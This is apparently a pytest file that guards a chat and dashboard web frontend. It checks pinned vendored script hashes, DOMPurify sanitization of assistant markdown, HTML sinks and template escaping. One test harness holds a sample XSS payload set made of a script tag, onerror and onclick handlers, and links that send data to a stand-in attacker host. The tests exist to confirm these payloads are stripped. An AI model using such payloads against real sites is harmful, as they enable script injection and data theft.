"""Security and integrity guards for the shipped browser code."""

from __future__ import annotations

import hashlib
import json
import re
import shutil
import subprocess
from pathlib import Path

import pytest

from inference_proxy.api.chat import templates as chat_templates
from inference_proxy.api.dashboard import templates as dashboard_templates

_ROOT = Path(__file__).resolve().parents[2]
_STATIC = _ROOT / "inference_proxy/static"
_TEMPLATES = _ROOT / "inference_proxy/templates"
_CHAT_JS = _STATIC / "js/chat.js"

_VENDORED_ASSETS = {
    "vendor/marked-18.0.7/marked.umd.js": (
        "7a1f8c5e7226b75ff16644bdb2c0130d2ae7371e7ea3106c2d6dac77ab0ff7b6"
    ),
    "vendor/dompurify-3.4.12/purify.min.js": (
        "c45ba939765574f96cbf35ee9b6d89f73756a17921814425e74b82f7c54603ce"
    ),
}


class _TemplateRequest:
    def url_for(self, _name: str, **params: str) -> str:
        return f"/static/{params['path']}"


def _node() -> str:
    executable = shutil.which("node")
    if executable is None:
        pytest.fail(
            "Node.js is required for frontend regressions; CI must install it explicitly"
        )
    return executable


def test_chat_uses_pinned_local_frontend_dependencies() -> None:
    rendered = chat_templates.get_template("chat.html").render(
        request=_TemplateRequest()
    )

    assert not re.search(r'<script[^>]+src=["\']https?://', rendered)
    for relative_path, expected_digest in _VENDORED_ASSETS.items():
        assert f"/static/{relative_path}" in rendered
        asset = _STATIC / relative_path
        assert hashlib.sha256(asset.read_bytes()).hexdigest() == expected_digest
        assert (asset.parent / "LICENSE").is_file()


def test_assistant_markdown_is_sanitized_at_every_render_site() -> None:
    harness = r"""
const fs = require("fs");
const vm = require("vm");
const source = fs.readFileSync(process.argv[1], "utf8");
let observedConfig = null;
const sanitizedOutputs = [];

const attack = [
  '<script>globalThis.pwned = true</script>',
  '<img src="https://attacker.invalid/?d=fleet-state" onerror="pwned()">',
  '<a href="https://attacker.invalid/collect">click me</a>',
  '<strong onclick="pwned()">safe emphasis</strong>',
].join("");

class Element {
  constructor() {
    this.children = [];
    this.className = "";
    this.classList = { add() {} };
    this.style = {};
    this._innerHTML = "";
  }
  get innerHTML() { return this._innerHTML; }
  set innerHTML(value) { this._innerHTML = value; this.children = []; }
  appendChild(child) { this.children.push(child); return child; }
  remove() {}
  querySelector(selector) {
    return this.children.find(function (child) {
      return selector === ".streaming-cursor" && child.className === "streaming-cursor";
    }) || null;
  }
}

let readCount = 0;
const streamPayload = Buffer.from(
  'data: {"choices":[{"delta":{"content":"unsafe"}}]}\n\n',
);

const sandbox = {
  console,
  Buffer,
  TextDecoder: class {
    decode(value) { return value ? value.toString() : ""; }
  },
  document: {
    addEventListener() {},
    createElement() { return new Element(); },
  },
  marked: { parse() { return attack; } },
  DOMPurify: {
    sanitize(html, config) {
      observedConfig = config;
      let safe = html.replace(/<script[\s\S]*?<\/script>/gi, "");
      safe = safe.replace(/<img\b[^>]*>/gi, "");
      safe = safe.replace(/<\/?a\b[^>]*>/gi, "");
      safe = safe.replace(/\s+on\w+="[^"]*"/gi, "");
      sanitizedOutputs.push(safe);
      return safe;
    },
  },
  fetch: async function () {
    return {
      ok: true,
      body: { getReader() { return { read: async function () {
        readCount += 1;
        return readCount === 1
          ? { done: false, value: streamPayload }
          : { done: true };
      } }; } },
    };
  },
};

vm.createContext(sandbox);
vm.runInContext(source, sandbox);
sandbox.showToast = function () {};
sandbox.messageAreaInner = new Element();
sandbox.messageArea = { scrollHeight: 100, scrollTop: 0, clientHeight: 100 };
sandbox.emptyState = { style: { display: "none" } };
sandbox.sendBtn = { disabled: false };
sandbox.chatInput = { disabled: false, focus() {} };
sandbox.modelSelect = { value: "org/model" };
sandbox.modelsAvailable = true;

(async function () {
  const bubble = sandbox.addMessage("assistant", "initial");
  await sandbox.streamResponse(bubble, { role: "user", content: "test" });
  process.stdout.write(JSON.stringify({
    html: bubble.innerHTML,
    config: observedConfig,
    sanitizedOutputs,
  }));
})().catch(function (error) { console.error(error); process.exit(1); });
"""
    result = subprocess.run(
        [_node(), "-e", harness, str(_CHAT_JS)],
        check=False,
        capture_output=True,
        text=True,
        timeout=3,
    )

    assert result.returncode == 0, result.stderr
    rendered = json.loads(result.stdout)
    assert "script" not in rendered["html"]
    assert "onerror" not in rendered["html"]
    assert "onclick" not in rendered["html"]
    assert "attacker.invalid" not in rendered["html"]
    assert rendered["html"] == "click me<strong>safe emphasis</strong>"
    assert rendered["config"]["ALLOWED_ATTR"] == []
    assert rendered["config"]["ALLOW_ARIA_ATTR"] is False
    assert rendered["config"]["ALLOW_DATA_ATTR"] is False
    assert "img" not in rendered["config"]["ALLOWED_TAGS"]
    assert "a" not in rendered["config"]["ALLOWED_TAGS"]
    assert rendered["sanitizedOutputs"] == [rendered["html"]] * 3

    source = _CHAT_JS.read_text()
    assert source.count("renderAssistantMarkdown(") == 4


def test_send_blocked_with_no_models_via_enter_key() -> None:
    harness = r"""
const fs = require("fs");
const vm = require("vm");
const source = fs.readFileSync(process.argv[1], "utf8");
const elements = new Map();
let domReady = null;
let completionRequests = 0;

class Element {
  constructor() {
    this.children = [];
    this.listeners = {};
    this.style = {};
    this.value = "";
    this.disabled = false;
    this._text = "";
  }
  get textContent() { return this._text; }
  set textContent(value) { this._text = String(value); if (value === "") this.children = []; }
  appendChild(child) { this.children.push(child); return child; }
  addEventListener(name, callback) { this.listeners[name] = callback; }
  querySelector() { return byId("message-area-inner"); }
  focus() {}
}

function byId(id) {
  if (!elements.has(id)) elements.set(id, new Element());
  return elements.get(id);
}

const sandbox = {
  console,
  document: {
    getElementById: byId,
    querySelector() { return null; },
    createElement() { return new Element(); },
    addEventListener(name, callback) { if (name === "DOMContentLoaded") domReady = callback; },
  },
  localStorage: { getItem() { return null; }, setItem() {} },
  requestAnimationFrame() {},
  setTimeout() { return 1; },
  DOMPurify: { sanitize(value) { return value; } },
  marked: { parse(value) { return value; } },
  fetch: async function (url) {
    if (url === "/v1/models") {
      return { ok: true, json: async function () { return { data: [] }; } };
    }
    if (url === "/v1/chat/completions") completionRequests += 1;
    return { ok: true, json: async function () { return {}; } };
  },
};

vm.createContext(sandbox);
vm.runInContext(source, sandbox);

(async function () {
  domReady();
  await sandbox.loadModels();
  const event = { key: "Enter", shiftKey: false, preventDefault() {} };
  byId("chat-input").listeners.keydown(event);
  await Promise.resolve();
  process.stdout.write(JSON.stringify({
    completionRequests,
    sendDisabled: byId("send-btn").disabled,
    placeholderValue: byId("model-select").children[0].value,
  }));
})().catch(function (error) { console.error(error); process.exit(1); });
"""
    result = subprocess.run(
        [_node(), "-e", harness, str(_CHAT_JS)],
        check=False,
        capture_output=True,
        text=True,
        timeout=3,
    )

    assert result.returncode == 0, result.stderr
    assert json.loads(result.stdout) == {
        "completionRequests": 0,
        "sendDisabled": True,
        "placeholderValue": "",
    }


def test_javascript_has_one_sanitized_html_sink() -> None:
    sinks: list[tuple[str, str]] = []
    pattern = re.compile(r"\.(?:innerHTML|outerHTML)\s*=|\.insertAdjacentHTML\s*\(")
    for path in sorted((_STATIC / "js").glob("*.js")):
        for line in path.read_text().splitlines():
            if pattern.search(line):
                sinks.append((path.name, line.strip()))

    assert sinks == [
        ("chat.js", "target.innerHTML = DOMPurify.sanitize("),
    ]


def test_node_detail_page_survives_backslash_in_hostname() -> None:
    rendered = dashboard_templates.get_template("node_detail.html").render(
        request=_TemplateRequest(),
        node_id="host01\\",
        poll_interval=10,
    )

    script = re.search(
        r"<script>\s*(const POLL_INTERVAL_MS.*?const NODE_ID.*?)</script>",
        rendered,
        re.DOTALL,
    )
    assert script is not None
    result = subprocess.run(
        [_node(), "-e", "new (require('vm').Script)(process.argv[1])", script.group(1)],
        check=False,
        capture_output=True,
        text=True,
        timeout=3,
    )
    assert result.returncode == 0, result.stderr

    node_literal = re.search(r"const NODE_ID = (.+);", script.group(1))
    assert node_literal is not None
    assert json.loads(node_literal.group(1)) == "host01\\"


def test_templates_have_no_raw_jinja_values_inside_scripts() -> None:
    quoted_jinja = re.compile(r"""["']\s*\{\{.*?\}\}\s*["']""")
    violations: list[str] = []

    for template in sorted(_TEMPLATES.glob("*.html")):
        for block in re.findall(
            r"<script(?:\s[^>]*)?>(.*?)</script>", template.read_text(), re.DOTALL
        ):
            if quoted_jinja.search(block):
                violations.append(template.name)

    assert violations == []
